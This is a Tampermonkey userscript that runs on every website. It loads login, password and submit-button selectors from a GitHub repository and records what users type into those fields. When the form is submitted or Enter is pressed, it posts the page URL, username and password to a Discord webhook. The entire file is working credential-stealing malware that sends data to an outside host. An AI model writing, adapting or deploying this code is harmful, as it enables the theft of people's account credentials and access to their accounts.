// ==UserScript==
// @name         Main
// @namespace    http://tampermonkey.net/
// @version      2024-10-29
// @description  try to take over the world!
// @author       You
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=tampermonkey.net
// @grant        GM_xmlhttpRequest
// @connect      *
// ==/UserScript==

(function() {
    'use strict';

    const fetchSelectors = (callback) => {
        let loginSelectors = "";
        let passwordSelectors = "";
        let submitSelectors = "";
        let completedRequests = 0;

        GM_xmlhttpRequest({
            method: "GET",
            url: "https://raw.githubusercontent.com/Filipsys/tampermonkey-script-config/refs/heads/main/allowed-password-selectors.json",
            responseType: "json",
            onload: (response) => {
                passwordSelectors = response.response.map((selector) => `${selector}`).join(", ");

                completedRequests++;
                checkCompletion();
            },
            onerror: (error) => {
                console.error("Error fetching the password selectors: ", error);
            }

        });

        GM_xmlhttpRequest({
            method: "GET",
            url: "https://raw.githubusercontent.com/Filipsys/tampermonkey-script-config/refs/heads/main/allowed-login-selectors.json",
            responseType: "json",
            onload: (response) => {
                loginSelectors = response.response.map((selector) => `${selector}`).join(", ");

                completedRequests++;
                checkCompletion();
            },
            onerror: (error) => {
                console.error("Error fetching the login selectors: ", error);
            }
        });

        GM_xmlhttpRequest({
            method: "GET",
            url: "https://raw.githubusercontent.com/Filipsys/tampermonkey-script-config/refs/heads/main/allowed-submit-button-selectors.json",
            responseType: "json",
            onload: (response) => {
                submitSelectors = response.response.map((selector) => `${selector}`).join(", ");

                completedRequests++;
                checkCompletion();
            },
            onerror: (error) => {
                console.error("Error fetching the submit selectors: ", error);
            }
        });

        const checkCompletion = () => completedRequests === 3 ? callback(loginSelectors, passwordSelectors, submitSelectors) : null;
    }

    fetchSelectors((loginSelectors, passwordSelectors, submitSelectors) => {
        const loginBox = document.querySelector(loginSelectors);
        const passwordBox = document.querySelector(passwordSelectors);
        const submitBox = document.querySelector(submitSelectors);

        if (!loginBox) console.log("Login is null");
        if (!passwordBox) console.log("Passwords are null");
        if (!submitBox) console.log("Submit is null");


        const discordWebhook = "WEBHOOK-HERE"
        let savedData = {
            url: window.location.href,
            login: "empty",
            password: "empty"
        }

        const sendWebhook = () => {
            GM_xmlhttpRequest({
                method: "POST",
                url: discordWebhook,
                headers: { "Content-Type": "application/json" },
                data: JSON.stringify({
                    username: "webhook",
                    content: `URL: \`${savedData.url}\` Username: \`${savedData.login}\` Password: \`${savedData.password}\``,
                }),
                onload: (response) => {
                    console.log("Successfully sent webhook");
                },
                onerror: (error) => {
                    console.error("Error sending webhook: ", error);
                }
            });
        };

        passwordBox ? passwordBox.addEventListener("input", (event) => {
            event.key === "Backspace" ? savedData.password.slice(0, -1) : savedData.password = event.target.value;
        }) : null;

        loginBox ? loginBox.addEventListener("input", (event) => {
            event.key === "Backspace" ? savedData.login.slice(0, -1) : savedData.login = event.target.value;
        }) : null;

        submitBox ? submitBox.addEventListener("click", (event) => sendWebhook()) : null;
        (passwordBox && loginBox) ? window.addEventListener("keydown", (event) => event.key === "Enter" ? sendWebhook() : null) : null;
    });
})();
